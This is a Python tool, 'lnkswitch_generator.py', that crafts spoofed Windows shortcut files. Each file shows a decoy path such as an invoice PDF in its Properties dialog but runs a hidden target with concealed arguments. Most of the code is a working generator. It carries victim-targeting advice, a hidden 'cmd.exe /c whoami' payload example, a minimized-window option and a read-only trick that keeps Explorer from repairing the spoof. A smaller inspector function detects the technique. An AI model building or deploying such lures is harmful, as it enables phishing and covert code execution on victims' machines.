#!/usr/bin/env python3
"""
lnkswitch_generator.py
══════════════════════════════════════════
LNKSwitch — LNK target spoofing using Variant 4.

HOW THE TRICK WORKS
────────────────────────────────
The EVDB (EnvironmentVariableDataBlock) has two path fields:
  - TargetAnsi    (260 bytes)  → real execution target
  - TargetUnicode (520 bytes)  → intentionally left NULL

When TargetUnicode is all null bytes, Explorer detects a mismatch and:
  - DISPLAYS the LinkTargetIDList path in Properties  (the lie, we control this)
  - EXECUTES the TargetAnsi path when opened          (the truth is hidden)
  - DISABLES the Target field in Properties (greyed out, uneditable)
  - HIDES any command-line arguments from the Properties dialog

LAYOUT
──────
  [Header 76B]
  [IDListSize 2B][IDList for DISPLAY path]  <- shown in Properties (fake)
  [StringData: icon, args if any]
  [EVDB 788B: TargetAnsi=real target, TargetUnicode=all zeros]

USAGE
─────
  python lnkswitch_generator.py --target  "C:\\Windows\\System32\\calc.exe" --display "C:\\Finance\\Q1_Invoice_2025.pdf" --output  invoice.lnk

  python lnkswitch_generator.py --inspect suspicious.lnk

Requirements: Python 3.9+, OS Windows, PowerShell
For educational and authorised security testing only.
"""

import argparse
import os
import struct
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Optional


# ─────────────────────────────────────────────────────────────────────────────
# LNK format constants
# ─────────────────────────────────────────────────────────────────────────────

HEADER_SIZE      = 0x4C
EVDB_BLOCK_SIZE  = 0x314   # 788 bytes, always !
EVDB_SIGNATURE   = 0xA0000001
EVDB_ANSI_LEN    = 260
EVDB_UNICODE_LEN = 520

LINK_CLSID = bytes([
    0x01, 0x14, 0x02, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0xC0, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x46
])

# LinkFlags
F_HAS_IDLIST    = 0x00000001
F_HAS_LINK_INFO = 0x00000002
F_HAS_NAME      = 0x00000004
F_HAS_REL_PATH  = 0x00000008
F_HAS_WORK_DIR  = 0x00000010
F_HAS_ARGS      = 0x00000020
F_HAS_ICON      = 0x00000040
F_IS_UNICODE    = 0x00000080
F_HAS_EXP_STR   = 0x00000200

ILLEGAL_CHARS = set('<>:"/|?*')


# ─────────────────────────────────────────────────────────────────────────────
# Dynamic IDList extraction
# ─────────────────────────────────────────────────────────────────────────────

def extract_idlist(target_path: str) -> bytes:
    """
    Dynamically extract a valid LinkTargetIDList for target_path by asking
    PowerShell/WScript.Shell to create a legitimate shortcut, then stealing
    the IDList bytes from the resulting binary.

    Returns raw IDList bytes WITHOUT the 2-byte size prefix.
    """
    if not os.path.exists(target_path):
        raise FileNotFoundError(
            f"Target not found: {target_path!r}\n"
            "The path must exist on disk for IDList extraction."
        )

    tmp = tempfile.mktemp(suffix='.lnk')
    esc_target = target_path.replace("'", "''")
    esc_tmp    = tmp.replace("'", "''")

    ps_cmd = (
        "$ws = New-Object -ComObject WScript.Shell; "
        f"$sc = $ws.CreateShortcut('{esc_tmp}'); "
        f"$sc.TargetPath = '{esc_target}'; "
        "$sc.Save()"
    )

    try:
        r = subprocess.run(
            ['powershell', '-NoProfile', '-NonInteractive', '-Command', ps_cmd],
            capture_output=True, text=True, timeout=15
        )
    except FileNotFoundError:
        raise RuntimeError("PowerShell not found. Windows + PowerShell required.")
    except subprocess.TimeoutExpired:
        raise RuntimeError("PowerShell timed out.")

    if r.returncode != 0:
        raise RuntimeError(f"PowerShell failed:\n{r.stderr.strip()}")
    if not os.path.exists(tmp):
        raise RuntimeError("Temp LNK not created by PowerShell... WeakShell ???")

    try:
        data = Path(tmp).read_bytes()
    finally:
        try:
            os.unlink(tmp)
        except OSError:
            pass

    if len(data) < HEADER_SIZE + 2:
        raise RuntimeError(f"Generated LNK too short: {len(data)} bytes")

    gen_flags = struct.unpack_from('<I', data, 0x14)[0]
    if not (gen_flags & F_HAS_IDLIST):
        raise RuntimeError(
            "WScript.Shell did not generate an IDList for this target.\n"
            "Use a full absolute path to the executable."
        )

    idlist_size  = struct.unpack_from('<H', data, HEADER_SIZE)[0]
    idlist_bytes = data[HEADER_SIZE + 2 : HEADER_SIZE + 2 + idlist_size]

    if len(idlist_bytes) != idlist_size:
        raise RuntimeError("IDList truncated in generated LNK.")

    return idlist_bytes


# ─────────────────────────────────────────────────────────────────────────────
# EVDB construction
# ─────────────────────────────────────────────────────────────────────────────

def build_evdb_variant4(real_target: str) -> bytes:
    """
    Build the 788-byte EnvironmentVariableDataBlock:
      - TargetAnsi    = real execution target   (what actually runs)
      - TargetUnicode = all null bytes          (its intentionally empty)

    When Explorer sees a populated TargetAnsi but empty TargetUnicode,
    it recognises the inconsistency and:
      - Shows the LinkTargetIDList path in Properties instead (our fake display path)
      - Greys out the Target field (user cannot click or inspect it)
      - Hides command-line arguments from the Properties dialog
      - Executes TargetAnsi when the LNK is opened

    No illegal characters needed. No normalization possible. Icon changes
    by the user do not repair the EVDB because the structure looks superficially
    valid it's the ansi mismatch that triggers the behaviour, not a detectable error.
    """
    assert len(real_target) < EVDB_ANSI_LEN, \
        f"Real target path too long: {len(real_target)} chars (max {EVDB_ANSI_LEN - 1})"

    buf = bytearray(EVDB_BLOCK_SIZE)

    struct.pack_into('<I', buf, 0, EVDB_BLOCK_SIZE)  # BlockSize  = 788
    struct.pack_into('<I', buf, 4, EVDB_SIGNATURE)   # Signature  = 0xA0000001

    # TargetAnsi: offset 8, 260 bytes — the REAL target
    ansi = real_target.encode('windows-1252', errors='replace')
    ansi = ansi[:EVDB_ANSI_LEN - 1]
    buf[8 : 8 + len(ansi)] = ansi

    # TargetUnicode: offset 268, 520 bytes — intentionally ALL ZEROS
    # (already zeroed by bytearray initialisation)

    assert len(buf) == EVDB_BLOCK_SIZE
    return bytes(buf)


# ─────────────────────────────────────────────────────────────────────────────
# Header & StringData helpers
# ─────────────────────────────────────────────────────────────────────────────

def build_header(flags: int, show_cmd: int = 1) -> bytes:
    """Build the fixed 76-byte ShellLinkHeader."""
    buf = bytearray(HEADER_SIZE)
    struct.pack_into('<I', buf, 0x00, HEADER_SIZE)
    buf[0x04:0x14] = LINK_CLSID
    struct.pack_into('<I', buf, 0x14, flags)
    struct.pack_into('<I', buf, 0x18, 0x00000020)   # FILE_ATTRIBUTE_NORMAL
    struct.pack_into('<I', buf, 0x3C, show_cmd)
    return bytes(buf)


def str_entry(s: str) -> bytes:
    """[2-byte CountCharacters LE][UTF-16LE, NOT null-terminated]"""
    enc = s.encode('utf-16-le')
    return struct.pack('<H', len(s)) + enc


# ─────────────────────────────────────────────────────────────────────────────
# Full LNK assembler
# ─────────────────────────────────────────────────────────────────────────────

def build_lnkswitch(
    real_target:  str,
    display_path: str,
    arguments:    Optional[str] = None,
    working_dir:  Optional[str] = None,
    icon_path:    Optional[str] = None,
    icon_index:   int = 0,
    show_cmd:     int = 1,
) -> bytes:
    """
    Build a complete Variant 4 LNKSwitch .lnk file.

    real_target:  path that actually executes  (goes into EVDB TargetAnsi)
    display_path: path shown in Properties     (goes into LinkTargetIDList)
    """

    # Extract IDList for the FAKE display path (what Properties shows)
    print(f"  [*] Extracting IDList for display path: {display_path}")
    display_idlist = extract_idlist(display_path)
    print(f"  [+] Display IDList: {len(display_idlist)} bytes")

    # Build EVDB with real target in TargetAnsi, TargetUnicode zeroed
    print(f"  [*] Building EVDB: TargetAnsi={real_target!r}, TargetUnicode=NULL")
    evdb = build_evdb_variant4(real_target)

    # Flags
    flags = F_HAS_IDLIST | F_HAS_EXP_STR | F_IS_UNICODE
    if working_dir: flags |= F_HAS_WORK_DIR
    if arguments:   flags |= F_HAS_ARGS
    if icon_path:   flags |= F_HAS_ICON

    header  = build_header(flags, show_cmd)
    idl_sec = struct.pack('<H', len(display_idlist)) + display_idlist

    # StringData (spec order: WORKING_DIR, ARGUMENTS, ICON_LOCATION)
    str_sec = b''
    if working_dir:
        str_sec += str_entry(working_dir)
    if arguments:
        str_sec += str_entry(arguments)
    if icon_path:
        if ',' in icon_path:
            icon_full = icon_path
        else:
            icon_full = f"{icon_path},{icon_index}" if icon_index else icon_path
        str_sec += str_entry(icon_full)

    return header + idl_sec + str_sec + evdb


# ─────────────────────────────────────────────────────────────────────────────
# Inspector / triage
# ─────────────────────────────────────────────────────────────────────────────

def inspect_lnk(filepath: str):
    """Parse an LNK and detect LNKSwitch indicators (both Variant 2 and 4)."""
    print(f"\n{'='*62}")
    print(f"  LNKSwitch Inspector: {os.path.basename(filepath)}")
    print(f"{'='*62}")

    data = Path(filepath).read_bytes()
    if len(data) < HEADER_SIZE + 2:
        print("[!] File too short.")
        return

    flags  = struct.unpack_from('<I', data, 0x14)[0]
    is_uni = bool(flags & F_IS_UNICODE)

    flag_names = {
        F_HAS_IDLIST:    'HasLinkTargetIDList',
        F_HAS_LINK_INFO: 'HasLinkInfo',
        F_HAS_WORK_DIR:  'HasWorkingDir',
        F_HAS_ARGS:      'HasArguments',
        F_HAS_ICON:      'HasIconLocation',
        F_IS_UNICODE:    'IsUnicode',
        F_HAS_EXP_STR:   'HasExpString',
    }
    print(f"\n  LinkFlags: {flags:#010x}")
    for bit, name in flag_names.items():
        if flags & bit:
            print(f"    + {name}")

    offset      = HEADER_SIZE
    idlist_hint = None

    if flags & F_HAS_IDLIST:
        idlist_size = struct.unpack_from('<H', data, offset)[0]
        idlist_data = data[offset + 2 : offset + 2 + idlist_size]
        offset += 2 + idlist_size

        hints = []
        for i in range(len(idlist_data) - 4):
            for drv in [b'C:\\', b'D:\\', b'E:\\', b'F:\\']:
                if idlist_data[i:].startswith(drv):
                    end = idlist_data.find(b'\x00', i)
                    candidate = idlist_data[i : end if end > i else i + 80]
                    try:
                        hints.append(candidate.decode('ascii'))
                    except UnicodeDecodeError:
                        pass
        if hints:
            idlist_hint = max(hints, key=len)

        print(f"\n  IDList  : {idlist_size} bytes")
        if idlist_hint:
            print(f"  IDList hint (Properties shows): {idlist_hint!r}")

    if flags & F_HAS_LINK_INFO:
        li_size = struct.unpack_from('<I', data, offset)[0]
        offset += li_size

    for flag, label in [
        (F_HAS_NAME,     'Name'),
        (F_HAS_REL_PATH, 'RelativePath'),
        (F_HAS_WORK_DIR, 'WorkingDir'),
        (F_HAS_ARGS,     'Arguments'),
        (F_HAS_ICON,     'IconLocation'),
    ]:
        if not (flags & flag) or offset + 2 > len(data):
            continue
        count  = struct.unpack_from('<H', data, offset)[0]
        offset += 2
        nbytes = count * (2 if is_uni else 1)
        raw    = data[offset : offset + nbytes]
        val    = raw.decode('utf-16-le' if is_uni else 'windows-1252', errors='replace')
        offset += nbytes
        trunc  = val[:100] + ('...' if len(val) > 100 else '')
        print(f"  {label:<14}: {trunc!r}")
        if label == 'Arguments' and len(val) > 260:
            print(f"    ⚠  Arg length {len(val)} > 260 — possible CVE-2025-9491 padding!")

    evdb_ansi = evdb_uni = None
    while offset + 8 <= len(data):
        try:
            bsz = struct.unpack_from('<I', data, offset)[0]
            if bsz < 4:
                break
            bsg = struct.unpack_from('<I', data, offset + 4)[0]
            if bsg == EVDB_SIGNATURE and bsz == EVDB_BLOCK_SIZE:
                ar  = data[offset + 8 : offset + 8 + EVDB_ANSI_LEN]
                end = ar.find(b'\x00')
                evdb_ansi = ar[:end if end != -1 else EVDB_ANSI_LEN].decode(
                    'windows-1252', errors='replace')
                ur = data[offset + 268 : offset + 268 + EVDB_UNICODE_LEN]
                ue = 0
                while ue + 1 < len(ur) and ur[ue:ue+2] != b'\x00\x00':
                    ue += 2
                evdb_uni = ur[:ue].decode('utf-16-le', errors='replace') if ue > 0 else None
            offset += bsz
        except struct.error:
            break

    print(f"\n  EVDB ANSI   : {evdb_ansi!r}")
    print(f"  EVDB Unicode: {evdb_uni!r}")

    print(f"\n  {'─'*56}")

    if (flags & F_HAS_IDLIST) and (flags & F_HAS_EXP_STR):
        # Variant 4: TargetAnsi populated, TargetUnicode null
        if evdb_ansi and not evdb_uni:
            print(f"  🔴  LNKSWITCH DETECTED  [Variant 4 — null TargetUnicode]")
            print(f"       Properties shows (IDList)  : {idlist_hint!r}")
            print(f"       Actually executes (EVDB)   : {evdb_ansi!r}")
            print(f"       Target field is greyed out.")
            print(f"\n       DO NOT open this file.")
        # Variant 2: EVDB contains illegal path char
        elif evdb_ansi:
            illegal = [c for c in evdb_ansi if c in ILLEGAL_CHARS]
            if illegal:
                visible = evdb_ansi.strip('"').strip()
                print(f"  🔴  LNKSWITCH DETECTED  [Variant 2 — invalid EVDB path]")
                print(f"       Illegal chars           : {illegal}")
                print(f"       Properties shows (EVDB) : {visible!r}")
                if idlist_hint:
                    print(f"       Actually executes (IDL) : {idlist_hint!r}")
                print(f"\n       DO NOT open this file.")
            else:
                print("  🟡  HasIDList + HasExpString both set — review manually.")
        else:
            print("  🟡  HasExpString with null EVDB — possible Variant 1.")
    else:
        print("  🟢  No LNKSwitch signature detected.")
    print()


# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description='LNKSwitch — Variant 4 LNK spoofing generator & inspector',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
⚠  For educational and authorised security testing ONLY.

Uses Variant 4: TargetAnsi=real target, TargetUnicode=null.
  - Survives icon changes by the user (no illegal chars to normalize)
  - Target field is greyed out in Properties
  - Arguments are hidden automatically

REQUIREMENT: --display must point to a real existing file on the target
system (it becomes the IDList — Explorer needs to resolve it for display).
Use any plausible document the victim is likely to have, like a real PDF.

Examples:

  Generate (show a real PDF path, execute calc):
    python lnkswitch_generator.py \\
        --target    "C:\\Windows\\System32\\calc.exe" \\
        --display   "C:\\Users\\Public\\Documents\\report.pdf" \\
        --read-only \\
        --output    report.lnk

  With icon and hidden payload:
    python lnkswitch_generator.py \\
        --target     "C:\\Windows\\System32\\cmd.exe" \\
        --args       "/c whoami > C:\\Users\\Public\\out.txt" \\
        --display    "C:\\Users\\Public\\Documents\\report.pdf" \\
        --icon       "C:\\Windows\\System32\\shell32.dll,153" \\
        --minimized \\
        --read-only \\
        --output     report.lnk

  Inspect a suspicious LNK:
    python lnkswitch_generator.py --inspect suspicious.lnk
        """
    )

    parser.add_argument('--inspect', metavar='FILE',
                        help='Inspect an existing LNK for spoofing indicators')
    parser.add_argument('--target', metavar='PATH',
                        help='Real execution target (goes into EVDB TargetAnsi)')
    parser.add_argument('--display', metavar='PATH',
                        help='Path shown in Properties (goes into IDList — must exist on disk)')
    parser.add_argument('--output', metavar='FILE', default='output.lnk')
    parser.add_argument('--args', metavar='STRING',
                        help='Command-line arguments (hidden from Properties automatically)')
    parser.add_argument('--working-dir', metavar='PATH')
    parser.add_argument('--icon', metavar='PATH[,INDEX]',
                        help='Icon path, optionally with index (e.g. shell32.dll,153)')
    parser.add_argument('--icon-index', metavar='N', type=int, default=0,
                        help='Icon index (only used if --icon has no comma)')
    parser.add_argument('--minimized', action='store_true',
                        help='Run target minimized/hidden (ShowCommand=7)')
    parser.add_argument('--read-only', action='store_true',
                        help='Set FILE_ATTRIBUTE_READONLY on the output LNK so Explorer '
                             'cannot repair the ansi/unicode mismatch after first execution. '
                             'Without this flag, the spoof is destroyed on first click.')
    parser.add_argument('--dry-run', action='store_true',
                        help='Assemble but do not write to disk')

    args = parser.parse_args()

    if args.inspect:
        if not os.path.exists(args.inspect):
            print(f"[!] File not found: {args.inspect}")
            sys.exit(1)
        inspect_lnk(args.inspect)
        sys.exit(0)

    if not args.target or not args.display:
        parser.error("--target and --display are both required.")

    show_cmd = 7 if args.minimized else 1

    print()
    print("  LNKSwitch Generator  [Variant 4]")
    print("  ─────────────────────────────────")
    print(f"  Real target  : {args.target}  (hidden — EVDB TargetAnsi)")
    print(f"  Display path : {args.display}  (shown — IDList)")
    print(f"  Output       : {args.output}")
    if args.args:        print(f"  Arguments    : {args.args}  (hidden automatically)")
    if args.working_dir: print(f"  Working dir  : {args.working_dir}")
    if args.icon:
        icon_display = args.icon if ',' in args.icon else f"{args.icon},{args.icon_index}"
        print(f"  Icon         : {icon_display}")
    print()

    try:
        lnk = build_lnkswitch(
            real_target  = args.target,
            display_path = args.display,
            arguments    = args.args,
            working_dir  = args.working_dir,
            icon_path    = args.icon,
            icon_index   = args.icon_index,
            show_cmd     = show_cmd,
        )
    except (FileNotFoundError, RuntimeError) as e:
        print(f"\n  [!] Error: {e}")
        sys.exit(1)

    if args.dry_run:
        print(f"  [~] Dry run — {len(lnk)} bytes, not written.")
        sys.exit(0)

    out = Path(args.output)
    out.write_bytes(lnk)

    if args.read_only:
        # Set FILE_ATTRIBUTE_READONLY so Explorer cannot repair the LNK
        # after execution. Without this, Explorer rewrites the file on first
        # click, fixing the ansi/unicode mismatch and destroying the spoof.
        import stat
        current = os.stat(out).st_mode
        os.chmod(out, current & ~stat.S_IWRITE)
        ro_note = "  (read-only — spoof survives repeated clicks)"
    else:
        ro_note = "  (writable — Explorer will repair on first click)"

    print(f"  [+] Written: {out.resolve()}  ({len(lnk)} bytes)")
    print()
    print("  Result summary")
    print("  ──────────────")
    print(f"  Properties dialog shows : {args.display!r}")
    print(f"  Target field            : greyed out (uneditable)")
    print(f"  Double-click executes   : {args.target!r}")
    if args.args:
        print(f"  Arguments               : hidden from Properties")
    print(f"  File attribute          :{ro_note}")
    print()


if __name__ == '__main__':
    main()